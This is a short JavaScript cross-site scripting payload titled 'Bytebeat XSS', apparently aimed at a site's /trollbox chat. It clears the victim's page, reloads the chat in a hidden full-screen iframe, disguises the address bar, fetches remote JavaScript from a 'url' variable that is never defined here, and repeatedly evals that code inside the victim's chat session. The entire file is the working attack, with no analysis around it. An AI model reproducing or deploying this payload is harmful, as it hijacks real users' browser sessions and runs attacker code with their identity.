// Bytebeat XSS
(function() {
    if(window.bb) {
        return;
    }
    window.bb = true;
    let js;
    let isTB = false;
    const request = new XMLHttpRequest();
    let iframe = document.createElement('iframe');

    // program flow
    document.documentElement.innerHTML = '';
    iframe.src = '/trollbox';
    iframe.style.width = '100vw';
    iframe.style.height = '100vh';
    iframe.style.display = 'block';
    iframe.style.border = 'none';
    document.body.appendChild(iframe);
    document.title = 'trollbox';
    document.body.style.margin = '0';
    history.replaceState(false, '', '/trollbox');
    request.open('GET', url, true);
    request.responseType = 'text';
    request.onload = () => {
        if (request.readyState == 4 && request.status == 200) {
            js = request.responseText;

            // duct tape code but it works
            setInterval(() => {
                if(iframe.contentWindow.location.pathname == '/trollbox/') {
                    if(!isTB) {
                        iframe.contentWindow.setTimeout(() => {
                            iframe.contentWindow.eval(js);
                        }, 700);
                    }
                    isTB = true;
                } else {
                    isTB = false;
                }
            }, 100);
        }
    };
    request.send();
})();
